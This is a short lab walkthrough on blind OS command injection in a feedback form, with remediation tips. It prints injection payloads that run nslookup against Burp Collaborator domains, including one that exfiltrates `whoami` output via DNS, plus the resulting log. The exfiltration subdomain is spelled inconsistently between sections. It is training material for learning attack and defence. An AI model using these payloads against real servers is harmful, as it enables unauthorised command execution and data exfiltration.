## 🧪 Lab: Blind OS Command Injection with Out-of-Band Data Exfiltration
**Level**: Practitioner  
**Date**: June 21, 2025  
**Goal**: Exploit a blind OS command injection vulnerability using out-of-band (OAST) DNS-based exfiltration via Burp Collaborator.

---

### 🧰 Tools
- Burp Suite Pro (Repeater / Collaborator)
- OAST DNS payloads
- Collaborator polling interface

---

### 🧭 Steps

1. Open the target **feedback form** as instructed.

2. Intercept the form submission request using **Burp Interceptor**, and **send to Repeater**.

3. Test for basic blind injection payloads:

```
email=xyz@gmail.com&ping+-c+5+127.0.0.1
```
❌ No delay or reflection. Likely a **blind injection** with no output.

4. Open **Burp Collaborator**, copy your DNS payload domain.

5. Inject the following OAST DNS payload:

```
email=xyz@gmail.com&nslookup+d5jziuy7pyb6gzzy4kz1wyv60x6pufi4.oastify.com#
```
✅ A DNS lookup appears in Collaborator — confirms code execution.

6. Refine the payload to **exfiltrate data (whoami)**:

```
email=xyz@gmail.com||nslookup+\`whoami\`.ngiringgr.oastify.com||
```
✅ Collaborator logs show:

```
peter-HrlzX6.ngiringgr.oastify.com
```
This confirms **command output** is being exfiltrated via DNS!

---

### 💣 Payloads

Trigger OAST injection:

```
xyz@gmail.com&nslookup+d5jziuy7pyb6gzzy4kz1wyv60x6pufi4.oastify.com#
```

Exfiltrate output (username):

```
xyz@gmail.com||nslookup+`whoami`.aangiringgr.oastify.com||
```

---

### 💡 Observations

- No reflection or delay = true blind injection  
- Burp Collaborator confirms both execution and output via DNS  
- Command substitution using backticks \`\` \` \`\`, useful for dynamic subdomain creation  
- Using \`||\` ensures shell doesn't break on malformed input  

---

### 🔒 Remediation

- Avoid shell calls with interpolated user input  
- Use safe libraries for system-level actions  
- Sanitize inputs strictly, especially in form fields  
- Monitor and restrict outbound traffic from servers  
- Disable DNS resolution from backend servers if not needed  
